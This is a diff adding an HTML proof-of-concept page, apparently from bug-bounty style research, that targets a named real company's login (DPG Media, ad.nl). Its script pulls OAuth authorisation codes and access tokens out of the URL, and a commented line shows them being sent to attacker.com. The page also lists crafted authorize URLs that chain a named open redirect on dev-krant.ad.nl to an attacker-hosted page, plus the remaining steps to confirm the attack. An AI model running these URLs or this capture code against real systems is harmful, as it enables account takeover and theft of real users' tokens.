@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>ad.nl - inloggen</title>
+</head>
+<body>
+<div id="stolen-data" style="background-color:#ff4444; color:white; padding:20px; margin-bottom:20px; text-align:center; font-size:18px; display:none;"></div>
+
+<script>
+// capture URL parameters (query string)
+var params = new URLSearchParams(window.location.search);
+
+// capture URL fragment (hash) - where OAuth tokens often appear
+var hash = window.location.hash.substring(1);
+var hashParams = new URLSearchParams(hash);
+
+// look for common OAuth parameters
+var code = params.get('code') || hashParams.get('code');
+var token = params.get('access_token') || hashParams.get('access_token');
+var idToken = params.get('id_token') || hashParams.get('id_token');
+var state = params.get('state') || hashParams.get('state');
+var error = params.get('error') || hashParams.get('error');
+
+var stolen = [];
+if (code) stolen.push('authorisation code: ' + code);
+if (token) stolen.push('access token: ' + token);
+if (idToken) stolen.push('id token: ' + idToken);
+if (state) stolen.push('state: ' + state);
+if (error) stolen.push('error: ' + error);
+
+var banner = document.getElementById('stolen-data');
+if (stolen.length > 0) {
+    banner.style.display = 'block';
+    banner.innerHTML = '<strong>OAuth tokens captured!</strong><br><br>' + stolen.join('<br>') + '<br><br>in a real attack, these would be sent to the attacker\'s server.';
+
+    // in a real attack, attacker would exfiltrate like this:
+    // new Image().src = 'https://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify({code, token, idToken, state}));
+} else {
+    // check for stolen param from open redirect test
+    var redirectSource = params.get('stolen');
+    if (redirectSource) {
+        banner.style.display = 'block';
+        banner.innerHTML = '<strong>redirected via: ' + redirectSource + '</strong><br>no OAuth tokens present - this tests the redirect chain only.';
+    }
+}
+</script>
+
+<h1>OAuth token theft PoC</h1>
+<p><strong>target:</strong> dpg media (ad.nl)</p>
+<p><strong>vulnerability:</strong> open redirect chained with OAuth flow to steal authorisation tokens</p>
+<hr>
+
+<h2>attack scenario</h2>
+<p>if dpg media's OAuth implementation allows *.ad.nl subdomains as valid redirect_uri values, an attacker could:</p>
+<ol>
+<li>craft a malicious OAuth authorisation URL with the open redirect as redirect_uri</li>
+<li>victim clicks the link (appears to be legitimate ad.nl login)</li>
+<li>victim authenticates with dpg media</li>
+<li>OAuth server redirects to dev-krant.ad.nl with authorisation code</li>
+<li>open redirect forwards victim (and their code/token) to this attacker page</li>
+<li>attacker captures the OAuth tokens from the URL</li>
+</ol>
+
+<h2>test URLs</h2>
+<p>to test if the OAuth flow is vulnerable, try these patterns:</p>
+
+<pre>
+# pattern 1: direct redirect_uri to open redirect
+https://login.dpgmedia.net/authorize
+  ?response_type=code
+  &client_id=[VALID_CLIENT_ID]
+  &redirect_uri=https://dev-krant.ad.nl/?wptouch_switch=desktop%26redirect=https://c137req.github.io/ad.nl/oauth-steal.html
+
+# pattern 2: if only *.ad.nl is allowed, chain through the open redirect
+https://mijn.ad.nl/oauth/authorize
+  ?response_type=code
+  &redirect_uri=https://dev-krant.ad.nl/?wptouch_switch=desktop%26redirect=https://c137req.github.io/ad.nl/oauth-steal.html
+
+# pattern 3: test with fragment response (implicit flow)
+https://login.dpgmedia.net/authorize
+  ?response_type=token
+  &client_id=[VALID_CLIENT_ID]
+  &redirect_uri=https://dev-krant.ad.nl/?wptouch_switch=desktop%26redirect=https://c137req.github.io/ad.nl/oauth-steal.html
+</pre>
+
+<h2>simulate token capture</h2>
+<p>click these links to simulate what happens when OAuth tokens arrive:</p>
+<ul>
+<li><a href="?code=SIMULATED_AUTH_CODE_abc123&state=random_state_xyz">simulate authorisation code capture</a></li>
+<li><a href="#access_token=SIMULATED_ACCESS_TOKEN_xyz789&token_type=Bearer&expires_in=3600">simulate implicit flow token capture</a></li>
+</ul>
+
+<hr>
+<h2>why this matters</h2>
+<p>if the OAuth authorisation server at dpg media allows any *.ad.nl subdomain as a valid redirect_uri, the open redirect on dev-krant.ad.nl can be abused to:</p>
+<ul>
+<li>steal OAuth authorisation codes</li>
+<li>steal access tokens (implicit flow)</li>
+<li>hijack user sessions</li>
+<li>access user accounts without their password</li>
+</ul>
+
+<h2>investigation needed</h2>
+<p>to confirm this attack works, the following needs to be verified:</p>
+<ol>
+<li>find valid client_id values used by dpg media apps</li>
+<li>check if *.ad.nl is in the redirect_uri whitelist</li>
+<li>test if the OAuth server validates the full redirect_uri or just the domain</li>
+</ol>
+
+<hr>
+<h2>technical details</h2>
+<pre>
+attack chain:
+victim --> OAuth authorize --> dev-krant.ad.nl (open redirect) --> attacker
+
+vulnerable endpoints:
+- dev-krant.ad.nl/?wptouch_switch=desktop&redirect=[attacker]
+- dev-krant.ad.nl/index.php?redirect=[attacker]
+- inapp-krant.ad.nl/?wptouch_switch=desktop&redirect=[attacker]
+
+OAuth endpoints found:
+- https://mijn.ad.nl/oauth/authorize
+- https://login.dpgmedia.net/authorize (WAF protected)
+- https://myprivacy.dpgmedia.nl/consent (consent flow)
+</pre>
+</body>
+</html>
